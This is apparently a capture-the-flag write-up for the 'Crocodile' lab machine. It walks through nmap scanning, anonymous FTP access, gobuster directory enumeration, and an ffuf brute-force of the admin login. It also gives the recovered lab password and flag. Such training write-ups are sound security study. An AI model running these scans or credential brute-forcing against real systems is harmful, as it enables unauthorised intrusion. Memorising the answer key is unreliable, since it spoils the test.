# Crocodile

---

## **Background**

- Linux machine
- A vulnerable FTP server instance allowing anonymous login and upon enumerating the server, sensitive files can be found containing clear-text credentials.
- Enumerating and fuzzing the website will reveal a hidden login endpoint where the previously acquired credentials can be used to gain access to the admin panel.

---

### Q1: What Nmap scanning switch employs the use of default scripts during a scan?

1. Used `nmap` man page and filtered using regex
    
    ```bash
    nmap --help | grep -i -E "(script.*default|default.*script)"
    
    :'
    	  -sC: equivalent to --script=default
    
    '
    ```
    
    Answer: -sC
    

### Q2: What service version is found to be running on port 21?

1. Used `nmap` again to scan the top-100 open ports and list their versions: 
    
    ```bash
    sudo nmap -T4 -F -sV --version-all <IP
    
    :'
    	PORT   STATE SERVICE VERSION
    	21/tcp open  ftp     vsftpd 3.0.3
    	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    	Service Info: OS: Unix
    '
    ```
    
    Answer: vsftpd 3.0.3
    

### Q3: What FTP code is returned to us for the "Anonymous FTP login allowed" message?

1. Used `nmap` (for third time 😃) to run NSE (Nmap Scripting Engine) scripts against port 21 on target: 
    
    ```bash
    sudo nmap -T4 -p21 -sVC <IP>
    
    :'
    	ftp-anon: Anonymous FTP login allowed (FTP code 230)
    '
    ```
    
    Answer: 230
    

### Q4: After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

1. Connected the FTP server using anonymous account: 
    
    ```bash
    ftp 10.129.1.15 21
    ```
    
    Answer: anonymous
    

### Q5: After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

1. In the FTP shell, I typed `help` in order to list all commands, there’s one command named `get` , so I used `help` again to list information about the command:
    
    ```bash
    help get
        
    :'
        	mget   get multiple files
    '
    ```
    
2. Used `mget` to download all files in the current directory:
    
    ```bash
    mget *
    ```
    
    Answer: get
    

### Q6: What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

1. Used cat to list file contents: 
    
    ```bash
    cat allowed.userlist
    
    :'
    	aron
    	pwnmeow
    	egotisticalsw
    	admin
    
    '
    ```
    
    Answer: admin
    

### Q7: What version of Apache HTTP Server is running on the target host?

1. Already have the answer from the scan at Q2, but I run another `nmap` scan to enum port 80: 
    
    ```bash
    sudo nmap -T4 -p80 -sVC 10.129.1.15
    
    :'
    	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    
    '
    ```
    
    Answer: Apache httpd 2.4.41 
    

### Q8: What switch can we use with Gobuster to specify we are looking for specific filetypes?

1. Checked `gobuster dir` help page and filtered with `grep` : 
    
    ```bash
    gobuster dir --help | grep -i extensions
    
    :'
    	--extensions value, -x value
    '
    ```
    
    Answer: -x
    

### Q9: Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?

1. Used `gobuster` to list all `.php` pages with status code other then 404,403,401 : 
    
    ```bash
    gobuster dir -u http://<IP>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .php -b "404,403"
    
    :'
    	/assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
    	/config.php           (Status: 200) [Size: 0]
    	/css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
    	/dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
    	/fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
    	/index.html           (Status: 200) [Size: 58565]
    	/js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
    	/login.php            (Status: 200) [Size: 1577]
    	/logout.php           (Status: 302) [Size: 0] [--> login.php]
    '
    ```
    
    Answer: login.php
    

### Q10: test

1. I used ffuf to brute force the password of the admin user: 
    
    ```bash
    ffuf -u http://10.129.1.15/login.php \
         -w allowed.userlist.passwd \
         -X POST \
         -d "username=admin&password=FUZZ" \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -fr "Incorrect"
    
    :'
    	root                    [Status: 200, Size: 1978, Words: 363, Lines: 46, Duration: 218ms]
    	Supersecretpassword1    [Status: 200, Size: 1978, Words: 363, Lines: 46, Duration: 226ms]
    	rKXM59ESxesUFHAd        [Status: 302, Size: 1258, Words: 202, Lines: 30, Duration: 227ms]
    	@BaASD&9032123sADS      [Status: 200, Size: 1978, Words: 363, Lines: 46, Duration: 228ms]
    '
    ```
    
2. By examining the status codes, its noticeable which one is the password 😃
    
    Answer: rKXM59ESxesUFHAd
    
    Flag: c7110277ac44d78b6a9fff2232434d16
